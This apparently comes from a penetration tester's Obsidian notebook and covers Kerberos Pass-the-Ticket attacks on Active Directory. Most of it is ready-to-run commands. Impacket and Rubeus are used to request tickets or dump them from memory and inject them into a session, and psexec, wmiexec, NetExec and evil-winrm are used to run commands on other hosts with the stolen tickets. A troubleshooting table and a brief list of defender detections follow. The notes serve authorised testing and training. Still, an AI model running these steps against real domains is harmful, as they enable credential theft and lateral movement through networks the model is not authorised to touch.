---
tags: [pentest, kerberos, ptt, ad, active-directory, initial-access, windows]
phase: 5
---
# Pass-the-Ticket (PtT)

Authenticate using a Kerberos TGT or service ticket instead of password/hash. Useful when NTLM is disabled, or to use harvested tickets from compromised user sessions.

[[06 - Gaining Access/00 - README|Folder index]]

## Get tickets

### Linux - request a TGT with creds (then PtT)

```bash
impacket-getTGT corp.local/user:pass -dc-ip 10.0.0.5
# Saves user.ccache in current dir

export KRB5CCNAME=$(pwd)/user.ccache
klist                                  # verify
```

### Linux - request a service ticket directly

```bash
impacket-getST -spn cifs/host.corp.local corp.local/user:pass -dc-ip 10.0.0.5
```

### Windows - dump tickets from memory (Rubeus)

```cmd
Rubeus.exe dump                                   :: all tickets in current session
Rubeus.exe dump /service:krbtgt /nowrap          :: just TGTs
Rubeus.exe dump /luid:0x3e7                      :: specific session
```

### Windows - request a TGT (Rubeus asktgt)

```cmd
Rubeus.exe asktgt /user:alice /password:pass /domain:corp.local /dc:dc01.corp.local /ptt
Rubeus.exe asktgt /user:alice /rc4:<NTLM> /domain:corp.local /dc:dc01.corp.local /ptt
Rubeus.exe asktgt /user:alice /aes256:<key> /domain:corp.local /dc:dc01.corp.local /ptt
```

`/ptt` injects the ticket into the current logon session.

## Use the ticket (Linux)

```bash
export KRB5CCNAME=/tmp/ticket.ccache

# Impacket auto-detects when -k -no-pass is set
impacket-psexec -k -no-pass corp.local/user@host.corp.local
impacket-wmiexec -k -no-pass corp.local/user@host.corp.local
impacket-smbclient -k -no-pass corp.local/user@host.corp.local

# NetExec - just specify -k
nxc smb host.corp.local -k --use-kcache
nxc winrm host.corp.local -k --use-kcache

# evil-winrm
evil-winrm -i host.corp.local -r corp.local
```

> [!note] Hostname not IP
> Kerberos uses *names*. Use FQDN (`host.corp.local`), not the IP. Add to `/etc/hosts` if needed.

## Use the ticket (Windows)

```cmd
:: After Rubeus /ptt - the ticket is in your current session
klist

:: Then any tool that uses Kerberos works as that user:
dir \\dc01\C$
psexec.exe \\dc01 cmd
```

## Convert between ticket formats

```bash
# .kirbi (Windows / Rubeus / Mimikatz) → .ccache (Linux)
impacket-ticketConverter ticket.kirbi ticket.ccache

# .ccache → .kirbi
impacket-ticketConverter ticket.ccache ticket.kirbi
```

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `KRB_AP_ERR_TKT_EXPIRED` | Ticket lifetime exceeded (default 10 hours). Request a new one. |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | Wrong service name. Use FQDN: `host.corp.local`, not IP. |
| `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` | User doesn't exist or wrong realm string. |
| `clock skew too great` | Sync time with DC: `sudo ntpdate <dc>`. |
| Ticket loaded but auth still fails | The ticket might be for the wrong SPN. Need a TGS for the specific service. |

## Why PtT > PtH sometimes

- Some targets are configured to require Kerberos (no NTLM fallback).
- Stealthier: Kerberos auth is the "normal" path.
- Some pivot scenarios only forward Kerberos.

## Defender's view

- Detect unusual ticket lifetimes / encryption types.
- Monitor for `klist` and ticket-export tools.
- Enable AES-only and disable RC4 across domain (forces upgrade attacks to be more visible).
- Reset krbtgt password TWICE periodically (kills forged Golden Tickets - see [[46 - Golden Ticket]]).

## See also

- [[17 - Pass-the-Hash]]
- [[19 - Overpass-the-Hash]]
- [[46 - Golden Ticket]]
